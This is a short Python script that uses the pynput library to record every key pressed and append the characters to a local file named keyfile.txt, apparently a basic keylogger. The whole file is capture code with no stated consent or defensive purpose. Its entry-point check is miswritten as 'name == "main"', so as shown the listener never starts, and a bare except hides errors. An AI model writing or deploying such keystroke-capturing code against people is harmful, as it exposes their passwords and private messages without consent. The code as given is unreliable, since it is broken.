from pynput import keyboard


def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting character")

if name == "main":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()